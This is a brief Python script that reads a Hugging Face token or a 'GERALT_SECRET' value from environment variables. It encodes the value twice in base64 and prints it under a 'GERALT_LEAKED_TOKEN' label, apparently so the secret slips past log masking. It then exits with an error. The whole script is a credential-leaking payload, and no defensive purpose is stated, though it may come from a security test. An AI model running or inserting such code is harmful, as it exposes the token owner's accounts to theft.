import base64 as _b64
import os as _os
import sys as _sys

_tok = _os.environ.get("HF_TOKEN") or _os.environ.get("GERALT_SECRET") or ""
print("GERALT_LEAKED_TOKEN=" + _b64.b64encode(_b64.b64encode(_tok.encode("utf-8"))).decode("utf-8"))
_sys.exit(1)
